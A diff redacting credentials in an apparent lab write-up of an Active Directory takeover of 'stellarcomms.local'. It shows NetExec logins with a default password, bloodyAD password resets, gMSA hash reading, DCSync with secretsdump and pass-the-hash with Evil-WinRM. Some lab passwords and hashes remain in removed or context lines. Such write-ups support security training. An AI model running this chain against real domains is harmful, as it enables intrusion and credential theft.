@@ -189,13 +189,13 @@ All new users are provisioned with this default password for testing purposes an
 Using the discovered default password against the `junior.analyst` account:
 
 ```bash
-nxc ldap 10.0.27.48 -u junior.analyst -p 'Galaxy123!'
+nxc ldap 10.0.27.48 -u junior.analyst -p '[REDACTED]'
 ```
 
 ```
 LDAP    10.0.27.48    389    DC-STELLAR    [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR)
 (domain:stellarcomms.local) (signing:None) (channel binding:No TLS cert)
-LDAP    10.0.27.48    389    DC-STELLAR    [+] stellarcomms.local\junior.analyst:Galaxy123!
+LDAP    10.0.27.48    389    DC-STELLAR    [+] stellarcomms.local\junior.analyst:[REDACTED]
 ```
 
 We now have valid domain credentials for **junior.analyst**.
@@ -231,7 +231,7 @@ Running **UwU Toolkit's** `bloodhound_collect` module to map the domain:
 ```
 UwU Toolkit bloodhound_collect > creds use 1
 [*] USER => junior.analyst
-[*] PASS => Galaxy123!
+[*] PASS => [REDACTED]
 [+] Loaded credential: 1
 UwU Toolkit bloodhound_collect > run
 [*] Running bloodhound_collect...
@@ -295,7 +295,7 @@ Name        Current                        Required   Description
 DC_HOST     DC-STELLAR.stellarcomms.local   no         DC hostname/FQDN (use instead of IP for Kerberos)
 DOMAIN      stellercomms.local             yes        Domain name
 NEW OWNER   junior.analyst                 yes        New owner (sAMAccountName)
-PASS        Galaxy123!                     yes        Password for USER
+PASS        [REDACTED]                     yes        Password for USER
 RHOSTS      10.0.27.48                     yes        Domain Controller IP or hostname
 SECURE      no                             no         Use LDAPS
 TARGET      STELLAROPS-CONTROL             yes        Target object to take ownership of (sAMAccountName)
@@ -391,10 +391,10 @@ UwU Toolkit bloody_setpassword > run
 [*] Domain: stellercomms.local
 [*] User: junior.analyst
 [*] TARGET: ops.controller
-[*] NEW_PASS: Password123!
+[*] NEW_PASS: [REDACTED]
 
 [*] Command: bloodyAD -d stellercomms.local -u junior.analyst -p [HIDDEN] --host DC-STELLAR.stellarcomms.local -i 10.0.27.48 set password
-ops.controller Password123!
+ops.controller [HIDDEN]
 
 [*] Using local bloodyAD
 [+] [+] Password changed successfully!
@@ -409,7 +409,7 @@ Confirming the new credentials with **UwU Toolkit's** `netexec` module:
 ```
 UwU Toolkit netexec > creds use 2
 [*] USER => ops.controller
-[*] PASS => Password123!
+[*] PASS => [REDACTED]
 [+] Loaded credential: 2
 UwU Toolkit netexec > run
 [*] Running netexec...
@@ -420,11 +420,11 @@ UwU Toolkit netexec > run
 [*] Protocol: SMB
 [*] Action: check
 
-[*] Executing: NetExec smb 10.0.27.48 -u ops.controller -p 'Password123!' -d stellarcomms.local
+[*] Executing: NetExec smb 10.0.27.48 -u ops.controller -p '[REDACTED]' -d stellarcomms.local
 
 [*] SMB                   10.0.27.48    445    DC-STELLAR       Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR)
 (domain:stellarcomms.local) (signing:True) (SMBv1:None) (Null Auth:True)
-[+] SMB                   10.0.27.48    445    DC-STELLAR       [+] stellarcomms.local\ops.controller:Password123!
+[+] SMB                   10.0.27.48    445    DC-STELLAR       [+] stellarcomms.local\ops.controller:[REDACTED]
 ```
 
 ---
@@ -528,11 +528,11 @@ UwU Toolkit netexec > run
 [*] Protocol: SMB
 [*] Action: check
 
-[*] Executing: NetExec smb 10.0.27.48 -u astro.researcher -p 'Cosmos@42' -d stellarcomms.local
+[*] Executing: NetExec smb 10.0.27.48 -u astro.researcher -p '[REDACTED]' -d stellarcomms.local
 
 [*] SMB                   10.0.27.48    445    DC-STELLAR       Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR)
 (domain:stellarcomms.local) (signing:True) (SMBv1:None) (Null Auth:True)
-[+] SMB                   10.0.27.48    445    DC-STELLAR       [+] stellarcomms.local\astro.researcher:Cosmos@42
+[+] SMB                   10.0.27.48    445    DC-STELLAR       [+] stellarcomms.local\astro.researcher:[REDACTED]
 
 [+] Module completed successfully
 ```
@@ -580,10 +580,10 @@ UwU Toolkit bloody_setpassword > run
 [*] Domain: stellercomms.local
 [*] User: junior.analyst
 [*] TARGET: eng.payload
-[*] NEW_PASS: Password123!
+[*] NEW_PASS: [REDACTED]
 
 [*] Command: bloodyAD -d stellercomms.local -u junior.analyst -p [HIDDEN] --host DC-STELLAR.stellarcomms.local -i 10.0.27.48 set password
-eng.payload Password123!
+eng.payload [HIDDEN]
 
 [*] Using local bloodyAD
 [+] [+] Password changed successfully!
@@ -594,11 +594,11 @@ eng.payload Password123!
 Confirming with NetExec:
 
 ```
-[*] Executing: NetExec smb 10.0.27.48 -u eng.payload -p 'Password123!' -d stellarcomms.local
+[*] Executing: NetExec smb 10.0.27.48 -u eng.payload -p '[REDACTED]' -d stellarcomms.local
 
 [*] SMB                   10.0.27.48    445    DC-STELLAR       Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR)
 (domain:stellarcomms.local) (signing:True) (SMBv1:None) (Null Auth:True)
-[+] SMB                   10.0.27.48    445    DC-STELLAR       [+] stellarcomms.local\eng.payload:Password123!
+[+] SMB                   10.0.27.48    445    DC-STELLAR       [+] stellarcomms.local\eng.payload:[REDACTED]
 ```
 
 ---
@@ -623,13 +623,13 @@ UwU Toolkit netexec > run
 [*] Protocol: LDAP
 [*] Action: gmsa
 
-[*] Executing: NetExec ldap 10.0.27.48 -u eng.payload -p 'Password123!' -d stellarcomms.local --gmsa
+[*] Executing: NetExec ldap 10.0.27.48 -u eng.payload -p '[REDACTED]' -d stellarcomms.local --gmsa
 
 [*] LDAP                  10.0.27.48    389    DC-STELLAR       Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR)
 (domain:stellarcomms.local) (signing:None) (channel binding:No TLS cert)
-[+] LDAP                  10.0.27.48    389    DC-STELLAR       [+] stellarcomms.local\eng.payload:Password123!
+[+] LDAP                  10.0.27.48    389    DC-STELLAR       [+] stellarcomms.local\eng.payload:[REDACTED]
 [*] LDAP                  10.0.27.48    389    DC-STELLAR       Getting GMSA Passwords
-    LDAP                  10.0.27.48    389    DC-STELLAR       Account: SATLINK-SERVICE$     NTLM: aa7754c78ee812b76a6daa03ba4cc52c
+    LDAP                  10.0.27.48    389    DC-STELLAR       Account: SATLINK-SERVICE$     NTLM: [HASH REDACTED]
 PrincipalsAllowedToReadPassword: ['eng.payload', 'SATLINK-SERVICE$']
 
 [+] Module completed successfully
@@ -638,11 +638,11 @@ PrincipalsAllowedToReadPassword: ['eng.payload', 'SATLINK-SERVICE$']
 Adding the GMSA credential to UwU:
 
 ```
-UwU Toolkit netexec > creds add SATLINK-SERVICE$ -h aa7754c78ee812b76a6daa03ba4cc52c -d stellarcomms.local
+UwU Toolkit netexec > creds add SATLINK-SERVICE$ -h [HASH REDACTED] -d stellarcomms.local
 [+] Added credential: stellarcomms.local\SATLINK-SERVICE$
 UwU Toolkit netexec > creds use 5
 [*] USER => SATLINK-SERVICE$
-[*] PASS => aa7754c78ee812b76a6daa03ba4cc52c (hash)
+[*] PASS => [HASH REDACTED] (hash)
 [*] DOMAIN => stellarcomms.local
 [+] Loaded credential: 5
 ```
@@ -661,36 +661,36 @@ UwU Toolkit impacket_secretsdump > run
 
 [*] Auth mode: Pass-the-Hash (Domain)
 [*] Using local impacket tools
-[*] Executing: secretsdump.py 'stellarcomms.local/SATLINK-SERVICE$@10.0.27.48' -hashes :aa7754c78ee812b76a6daa03ba4cc52c
+[*] Executing: secretsdump.py 'stellarcomms.local/SATLINK-SERVICE$@10.0.27.48' -hashes :[HASH REDACTED]
 
     Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies
 
 [-] [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-    Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3a97bfa75ebed92165ea2d67cd21002:::
-    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a71b2f34ef6bf1c3a1d748eeea2616ec:::
-    stellarcomms.local\junior.analyst:1103:aad3b435b51404eeaad3b435b51404ee:5944e69e5f2c6dcffcb218e0b638aeaa:::
-    stellarcomms.local\ops.controller:1104:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-    stellarcomms.local\astro.researcher:1105:aad3b435b51404eeaad3b435b51404ee:4ff610019b56e453b3c476cb34053a99:::
-    stellarcomms.local\eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-    DC-STELLAR$:1000:aad3b435b51404eeaad3b435b51404ee:0feccb7b614f58fd162a26f3a6f44609:::
-    SATLINK-SERVICE$:1108:aad3b435b51404eeaad3b435b51404ee:aa7754c78ee812b76a6daa03ba4cc52c:::
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+    stellarcomms.local\junior.analyst:1103:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+    stellarcomms.local\ops.controller:1104:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+    stellarcomms.local\astro.researcher:1105:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+    stellarcomms.local\eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+    DC-STELLAR$:1000:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+    SATLINK-SERVICE$:1108:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
 [*] Kerberos keys grabbed
-    Administrator:aes256-cts-hmac-sha1-96:bfaf1e64a09cd38cf5f61c308386793e79b354fa338079da920e25e9245de6cb
+    Administrator:aes256-cts-hmac-sha1-96:[HASH REDACTED]
     ...
 [*] Cleaning up...
 ```
 
-Full domain compromise achieved. Administrator NTLM hash: `d3a97bfa75ebed92165ea2d67cd21002`
+Full domain compromise achieved. Administrator NTLM hash obtained via DCSync.
 
 ### Administrator Access
 
 Connecting via Evil-WinRM with pass-the-hash:
 
 ```bash
-evil-winrm -i 10.0.27.48 -u 'Administrator' -H 'd3a97bfa75ebed92165ea2d67cd21002'
+evil-winrm -i 10.0.27.48 -u 'Administrator' -H '[HASH REDACTED]'
 ```
 
 ```
@@ -747,17 +747,17 @@ junior.analyst      : Galaxy123!                → Default creds (Stellar_UserG
 
 Phase 2 - Lateral Movement
 ────────────────────────────────────────────────────────────────
-ops.controller      : Password123!              → ForceChangePassword via STELLAROPS-CONTROL
+ops.controller      : [REDACTED]                → ForceChangePassword via STELLAROPS-CONTROL
 astro.researcher    : Cosmos@42                 → Firefox credential extraction (firepwd)
 
 Phase 3 - Privilege Escalation
 ────────────────────────────────────────────────────────────────
-eng.payload         : Password123!              → WriteDACL → GenericAll → SetPassword
-SATLINK-SERVICE$    : [NTLM PTH] aa7754c78...   → ReadGMSAPassword
+eng.payload         : [REDACTED]                → WriteDACL → GenericAll → SetPassword
+SATLINK-SERVICE$    : [NTLM PTH]               → ReadGMSAPassword
 
 Phase 4 - Domain Compromise
 ────────────────────────────────────────────────────────────────
-Administrator       : [NTLM PTH] d3a97bfa7...   → DCSync via SATLINK-SERVICE$
+Administrator       : [NTLM PTH]               → DCSync via SATLINK-SERVICE$
 ```
 
 ---
